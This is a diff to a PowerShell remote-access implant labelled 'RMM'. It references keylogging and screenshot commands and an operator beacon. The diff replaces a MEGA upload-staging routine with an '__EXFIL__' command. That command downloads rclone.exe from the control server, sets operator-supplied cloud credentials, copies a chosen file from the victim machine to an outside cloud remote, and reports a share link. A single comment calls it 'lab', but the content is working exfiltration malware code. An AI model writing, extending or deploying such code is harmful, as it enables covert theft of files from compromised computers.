@@ -56,9 +56,6 @@ $httpProxyUseDefaultCredentials = $false
 
 $verboseHttp = $false
 
-# MEGA upload via server staging (lab); max bytes before upload (default 100 MB).
-$megaMaxBytes = 104857600
-
 $script:RmmRegisterConfigSynced = $false
 
 # -----------------------------------------------------------------------------
@@ -82,9 +79,6 @@ if ($env:RMM_HTTP_PROXY -and $env:RMM_HTTP_PROXY.Trim().Length -gt 0) {
 if ($env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS -and
     $env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS.Trim() -match '^(?i)(1|true|yes|on)$') {
     $httpProxyUseDefaultCredentials = $true
-}
-if ($env:RMM_MEGA_MAX_BYTES -and $env:RMM_MEGA_MAX_BYTES.Trim() -match '^\d+$') {
-    $megaMaxBytes = [long]$env:RMM_MEGA_MAX_BYTES.Trim()
 }
 
 # -----------------------------------------------------------------------------
@@ -811,7 +805,7 @@ function Test-RmmInternalCommand {
     if ($c -match '^(?i)__STOP__$') { return $true }
     if ($c -match '^(?i)__CONFIG__\s') { return $true }
     if ($c -match '^(?i)__DOWNLOAD__\s') { return $true }
-    if ($c -match '^(?i)__MEGA__\s') { return $true }
+    if ($c -match '^(?i)__EXFIL__$') { return $true }
     if ($c -match '^(?i)__UPLOAD__') { return $true }
     if ($c -match '^(?i)__SCREENSHOT__$') { return $true }
     if ($c -match '^(?i)__KEYLOG__\s') { return $true }
@@ -839,111 +833,207 @@ function Send-RmmTextResult {
     }
 }
 
-function Parse-RmmMegaCommand {
-    param([Parameter(Mandatory = $true)][string]$CommandLine)
-    if ($CommandLine -match '^(?i)__MEGA__\s+(.*)$') {
-        return @{ FilePath = $Matches[1].Trim() }
+function Get-RmmRcloneCachePath {
+    $dir = Join-Path $env:LOCALAPPDATA 'RMM'
+    return @{
+        Directory = $dir
+        Binary    = (Join-Path $dir 'rclone.exe')
     }
-    return @{ FilePath = '' }
 }
 
-function Send-RmmMegaStaging {
+function Save-RmmBeaconFile {
     param(
-        [Parameter(Mandatory = $true)][string]$FilePath,
-        [string]$RemotePath = $FilePath,
+        [Parameter(Mandatory = $true)][string]$RelativeUrl,
+        [Parameter(Mandatory = $true)][string]$DestPath,
         [hashtable]$Headers = @{}
     )
-    $fileName = Split-Path $FilePath -Leaf
-    $uploadId = [guid]::NewGuid().ToString('N')
-    $chunkBytes = 6MB
-    $resultUrl = "$u/result?id=$sessionId&type=mega_staging"
-    $fs = [System.IO.File]::OpenRead($FilePath)
-    try {
-        $offset = [long]0
-        $fileLen = $fs.Length
-        if ($fileLen -eq 0) {
-            $payload = @{
-                filename     = $fileName
-                remote_path  = $RemotePath
-                upload_id    = $uploadId
-                offset       = 0
-                eof          = $true
-                content      = ''
-            } | ConvertTo-Json -Compress
-            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
-            return
+    $sep = if ($RelativeUrl -match '\?') { '&' } else { '?' }
+    $uri = "$u$RelativeUrl${sep}id=$sessionId"
+    $origUri = [System.Uri]::new($uri)
+    $resolved = Resolve-RmmTunnelIpv4 -Uri $origUri
+    $builder = New-Object System.UriBuilder $origUri
+    $builder.Host = $resolved.Ipv4.ToString()
+    $wireUri = $builder.Uri
+
+    $req = [System.Net.HttpWebRequest]::Create($wireUri)
+    $req.Method = 'GET'
+    $req.Host = $resolved.OriginalHost
+    $req.AllowAutoRedirect = $true
+    $req.Timeout = 600000
+    $req.ReadWriteTimeout = 600000
+    $req.KeepAlive = $false
+    if ($script:RmmWebProxy) { $req.Proxy = $script:RmmWebProxy }
+    foreach ($key in $Headers.Keys) {
+        $name = [string]$key
+        $val = [string]$Headers[$key]
+        if ($name -match '(?i)^(User-Agent)$') { $req.UserAgent = $val }
+        elseif ($name -match '(?i)^(Accept)$') { $req.Accept = $val }
+        elseif ($name -notmatch '(?i)^(Host|Connection)$') {
+            try { [void]$req.Headers.Add($name, $val) } catch { }
         }
-        while ($true) {
-            $buf = New-Object byte[] $chunkBytes
-            $n = $fs.Read($buf, 0, $chunkBytes)
-            if ($n -le 0) { break }
-            if ($n -lt $chunkBytes) {
-                $slice = New-Object byte[] $n
-                [Array]::Copy($buf, $slice, $n)
-                $b64 = [Convert]::ToBase64String($slice)
-            } else {
-                $b64 = [Convert]::ToBase64String($buf)
-            }
-            $eof = ($offset + $n) -ge $fileLen
-            $payload = @{
-                filename     = $fileName
-                remote_path  = $RemotePath
-                upload_id    = $uploadId
-                offset       = $offset
-                eof          = $eof
-                content      = $b64
-            } | ConvertTo-Json -Compress
-            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
-            $offset += $n
-            if ($eof) { break }
+    }
+
+    $response = $req.GetResponse()
+    $http = [System.Net.HttpWebResponse]$response
+    try {
+        if ([int]$http.StatusCode -ge 400) {
+            throw "HTTP $([int]$http.StatusCode) downloading $RelativeUrl"
+        }
+        $parent = Split-Path -Parent $DestPath
+        if ($parent -and -not (Test-Path -LiteralPath $parent)) {
+            New-Item -ItemType Directory -Force -Path $parent | Out-Null
+        }
+        $rs = $http.GetResponseStream()
+        $fs = [System.IO.File]::Create($DestPath)
+        try {
+            $rs.CopyTo($fs)
+        } finally {
+            $fs.Close()
+            $rs.Close()
         }
     } finally {
-        $fs.Dispose()
+        $http.Close()
     }
 }
 
-function Send-RmmMegaErrorResult {
+function Ensure-RmmRcloneBinary {
     param(
-        [string]$RemotePath,
-        [string]$ErrorMessage,
+        [string]$RelativeUrl = '/tools/rclone.exe',
         [hashtable]$Headers = @{}
     )
-    $payload = @{
-        type         = 'mega_upload'
-        remote_path  = $RemotePath
-        success      = $false
-        link         = $null
-        size         = 0
-        error        = $ErrorMessage
+    $cache = Get-RmmRcloneCachePath
+    if (Test-Path -LiteralPath $cache.Binary -PathType Leaf) {
+        return $cache.Binary
     }
-    $json = $payload | ConvertTo-Json -Compress -Depth 6
-    $resultUrl = "$u/result?id=$sessionId&type=mega_upload"
+    Write-RmmLog "Downloading rclone to $($cache.Binary)" -Level DEBUG
+    Save-RmmBeaconFile -RelativeUrl $RelativeUrl -DestPath $cache.Binary -Headers $Headers
+    if (-not (Test-Path -LiteralPath $cache.Binary -PathType Leaf)) {
+        throw 'rclone download failed'
+    }
+    return $cache.Binary
+}
+
+function Send-RmmCloudUploadResult {
+    param(
+        [hashtable]$Payload,
+        [hashtable]$Headers = @{}
+    )
+    $json = $Payload | ConvertTo-Json -Compress -Depth 8
+    $resultUrl = "$u/result?id=$sessionId&type=cloud_upload"
     Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop | Out-Null
 }
 
-function Invoke-RmmMegaUpload {
+function Invoke-RmmRcloneExfil {
     param(
         [Parameter(Mandatory = $true)][string]$CommandLine,
         [hashtable]$Headers = @{}
     )
-    $parsed = Parse-RmmMegaCommand -CommandLine $CommandLine
-    $filePath = $parsed.FilePath
-    if (-not $filePath) {
-        throw 'Missing remote file path in __MEGA__ command'
+    $parts = $CommandLine -split "`n", 2
+    if ($parts.Count -lt 2 -or -not $parts[1].Trim()) {
+        throw 'Missing __EXFIL__ JSON payload'
     }
-    if (-not (Test-Path -LiteralPath $filePath -PathType Leaf)) {
-        Send-RmmMegaErrorResult -RemotePath $filePath -ErrorMessage "File not found: $filePath" -Headers $Headers
-        return @{ success = $false; error = "File not found: $filePath"; link = $null }
+    $job = $parts[1].Trim() | ConvertFrom-Json
+    $localPath = [string]$job.local_path
+    if (-not $localPath) {
+        throw 'Missing local_path in __EXFIL__ payload'
     }
-    $fileInfo = Get-Item -LiteralPath $filePath
-    if ($fileInfo.Length -gt $megaMaxBytes) {
-        $err = "File size $($fileInfo.Length) exceeds MEGA limit ($megaMaxBytes bytes)"
-        Send-RmmMegaErrorResult -RemotePath $filePath -ErrorMessage $err -Headers $Headers
+    if (-not (Test-Path -LiteralPath $localPath -PathType Leaf)) {
+        $err = "File not found: $localPath"
+        Send-RmmCloudUploadResult -Payload @{
+            remote_path = $localPath
+            profile     = [string]$job.profile
+            backend     = [string]$job.backend
+            success     = $false
+            link        = $null
+            dest        = [string]$job.dest
+            size        = 0
+            error       = $err
+        } -Headers $Headers
         return @{ success = $false; error = $err; link = $null }
     }
-    Write-RmmLog "Staging file for MEGA upload ($($fileInfo.Length) bytes): $filePath" -Level DEBUG
-    Send-RmmMegaStaging -FilePath $filePath -RemotePath $filePath -Headers $Headers
-    return @{ success = $true; link = $null; error = $null }
+
+    $fileInfo = Get-Item -LiteralPath $localPath
+    $maxBytes = [long]$job.max_bytes
+    if ($maxBytes -gt 0 -and $fileInfo.Length -gt $maxBytes) {
+        $err = "File size $($fileInfo.Length) exceeds exfil limit ($maxBytes bytes)"
+        Send-RmmCloudUploadResult -Payload @{
+            remote_path = $localPath
+            profile     = [string]$job.profile
+            backend     = [string]$job.backend
+            success     = $false
+            link        = $null
+            dest        = [string]$job.dest
+            size        = [long]$fileInfo.Length
+            error       = $err
+        } -Headers $Headers
+        return @{ success = $false; error = $err; link = $null }
+    }
+
+    $rcloneUrl = if ($job.rclone_url) { [string]$job.rclone_url } else { '/tools/rclone.exe' }
+    $rclonePath = Ensure-RmmRcloneBinary -RelativeUrl $rcloneUrl -Headers $Headers
+    $remoteName = if ($job.remote_name) { [string]$job.remote_name } else { 'RMM' }
+    $dest = [string]$job.dest
+    $remoteTarget = "${remoteName}:${dest}"
+
+    $savedEnv = @{}
+    if ($job.env) {
+        foreach ($prop in $job.env.PSObject.Properties) {
+            $key = [string]$prop.Name
+            $savedEnv[$key] = [Environment]::GetEnvironmentVariable($key, 'Process')
+            Set-Item -Path "Env:$key" -Value ([string]$prop.Value)
+        }
+    }
+
+    try {
+        Write-RmmLog "rclone copyto $localPath -> $remoteTarget ($($fileInfo.Length) bytes)" -Level DEBUG
+        $copyOut = & $rclonePath copyto $localPath $remoteTarget --config NUL --retries 3 2>&1
+        if ($LASTEXITCODE -ne 0) {
+            $detail = ($copyOut | Out-String).Trim()
+            if ($detail.Length -gt 500) { $detail = $detail.Substring(0, 500) }
+            throw "rclone copyto failed (exit $LASTEXITCODE): $detail"
+        }
+
+        $link = $null
+        if ($job.link_command) {
+            $linkOut = & $rclonePath link $remoteTarget --config NUL 2>&1
+            if ($LASTEXITCODE -eq 0) {
+                $link = ($linkOut | Select-Object -Last 1).ToString().Trim()
+            }
+        }
+
+        Send-RmmCloudUploadResult -Payload @{
+            remote_path = $localPath
+            profile     = [string]$job.profile
+            backend     = [string]$job.backend
+            success     = $true
+            link        = $link
+            dest        = $dest
+            size        = [long]$fileInfo.Length
+            error       = $null
+        } -Headers $Headers
+        return @{ success = $true; error = $null; link = $link }
+    } catch {
+        $err = $_.Exception.Message
+        Send-RmmCloudUploadResult -Payload @{
+            remote_path = $localPath
+            profile     = [string]$job.profile
+            backend     = [string]$job.backend
+            success     = $false
+            link        = $null
+            dest        = $dest
+            size        = [long]$fileInfo.Length
+            error       = $err
+        } -Headers $Headers
+        return @{ success = $false; error = $err; link = $null }
+    } finally {
+        foreach ($key in $savedEnv.Keys) {
+            if ($null -eq $savedEnv[$key]) {
+                Remove-Item -Path "Env:$key" -ErrorAction SilentlyContinue
+            } else {
+                Set-Item -Path "Env:$key" -Value $savedEnv[$key]
+            }
+        }
+    }
 }
 
 function Send-RmmFileDownload {
@@ -1984,17 +2074,21 @@ while ($true) {
                     Write-Host "[-] $errorMsg" -ForegroundColor Red
                 }
             }
-            elseif ($command -like "__MEGA__ *") {
+            elseif ($command -like "__EXFIL__*") {
                 try {
-                    $megaResult = Invoke-RmmMegaUpload -CommandLine $command -Headers $headers
-                    if ($megaResult.success) {
-                        Write-Host "[+] Staged for MEGA upload (link appears in operator transcript)" -ForegroundColor Green
+                    $exfilResult = Invoke-RmmRcloneExfil -CommandLine $command -Headers $headers
+                    if ($exfilResult.success) {
+                        if ($exfilResult.link) {
+                            Write-Host "[+] Exfil complete: $($exfilResult.link)" -ForegroundColor Green
+                        } else {
+                            Write-Host "[+] Exfil complete (see operator transcript)" -ForegroundColor Green
+                        }
                     } else {
-                        $err = if ($megaResult.error) { $megaResult.error } else { 'MEGA upload failed' }
-                        Write-Host "[-] MEGA upload failed: $err" -ForegroundColor Red
+                        $err = if ($exfilResult.error) { $exfilResult.error } else { 'Exfil failed' }
+                        Write-Host "[-] Exfil failed: $err" -ForegroundColor Red
                     }
                 } catch {
-                    $err = "MEGA upload failed: $($_.Exception.Message)"
+                    $err = "Exfil failed: $($_.Exception.Message)"
                     Write-Host "[-] $err" -ForegroundColor Red
                 }
             }
